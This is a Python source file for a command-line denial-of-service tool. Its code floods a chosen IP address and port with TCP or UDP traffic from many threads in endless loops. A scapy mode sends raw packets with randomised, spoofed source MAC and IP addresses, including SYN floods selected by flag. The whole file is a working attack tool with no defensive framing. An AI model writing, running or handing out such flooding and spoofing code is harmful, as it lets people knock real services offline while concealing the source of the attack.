import socket
import threading
from scapy.all import *
import argparse


L=[]

class Dos():

    def __init__(self,ip,port,thread_s,flag,data,size):
        self.ip = ip
        self.port = port
        self.thread_s = thread_s
        self.flag = flag
        self.data = data * size
        self._stat_()

    def _stat_(self):
        print(f"{'\033[94m'}[#] Target:{self.ip}  Port:{self.port}  Threads:N°{self.thread_s}  Flag:{self.flag}  Data:{self.data[:5]}....")
        print(f"{'\033[31m'}[+]  Attack Started!!!")

    def err_handle(self,m):
        if m not in L:
            print(f"{'\033[33m'}[???] {m}")
            L.append(m)
    
    def connect_tcp(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while 1:
            try:
                s.connect((self.ip,self.port))
                s.send(self.data.encode())
            except Exception as e:
                self.err_handle(str(e))
        s.close()

    def connect_udp(self):

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while 1:
            try:
                s.connect((self.ip,self.port))
                s.sendto(self.data.encode(),((self.ip,self.port)))
            except Exception as e:
                self.err_handle(str(e))
        s.close()


    def tcp_dos(self):

        for _ in range(self.thread_s):
            t = threading.Thread(target=self.connect_tcp)
            t.start()
        
        print(f"{'\033[92m'}[!!!] Threads has Been Ended")

    def udp_dos(self):

        for _ in range(self.thread_s):
            t = threading.Thread(target=self.connect_udp)
            t.start()
        print(f"{'\033[92m'}[!!!] Threads has Been Ended")


    def spoof_connect_tcp(self):
        while 1:
            try:
                packet = Ether(src=str(RandMAC()))/IP(src=str(RandIP()),dst=self.ip,flags="DF")/TCP(sport=int(RandShort()),dport=self.port,flags=self.flag)/Raw(load=self.data)
                sendp(packet,verbose=0)
            except Exception as e:
                self.err_handle(str(e))


    def spoof_connect_udp(self):
        while 1:
            try:
                packet = Ether(src=str(RandMAC()))/IP(src=str(RandIP()),dst=self.ip,flags="DF")/UDP(sport=int(RandShort()),dport=self.port)/Raw(load=self.data)
                sendp(packet,verbose=0)
            except Exception as e:
                self.err_handle(str(e))


    def Stcp_dos(self):

        for _ in range(self.thread_s):
            t = threading.Thread(target=self.spoof_connect_tcp)
            t.start()
        print(f"{'\033[92m'}[!!!] Threads has Been Ended")


    def Sudp_dos(self):

        for _ in range(self.thread_s):
            t = threading.Thread(target=self.spoof_connect_udp)
            t.start()
        print(f"{'\033[92m'}[!!!] Threads has Been Ended")


def main():
    parser = argparse.ArgumentParser()    
    parser.add_argument("-ip", help="Target IP", type=str)
    parser.add_argument("-p", help="Target Port", type=int,default=80)
    parser.add_argument("-t", help="Number Of Threads", type=int,default=50)
    parser.add_argument("-protocol", help="Protocol TCP or UDP?", type=str)
    parser.add_argument("-spoof", help="-spoof 1 For Spoof Attack",dest="spoof",action='store_true')
    parser.add_argument("-flag", help="Flags S,SA,R,F...", type=str, default="S")
    parser.add_argument("-data", help="Raw Load", type=str, default="X")
    parser.add_argument("-size", help="Data *SIZE", type=int,default=50)
    parser.parse_args()
    args = parser.parse_args()


    if args.protocol == "TCP" and args.spoof == 0 and args.flag == "S":
        Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).tcp_dos()

    elif args.protocol == "UDP" and args.spoof == 0 and args.flag == "S":
        Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).udp_dos()

    elif args.protocol == "TCP" and (args.spoof == 1 or args.flag != "S"):
        Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).Stcp_dos()

    elif args.protocol == "UDP" and args.spoof == 1:
        Dos(ip=args.ip,port=args.p,thread_s=args.t,flag=args.flag,data=args.data,size=args.size).Sudp_dos()
    else:
        print("[-]python3 dos.py -h")



main()
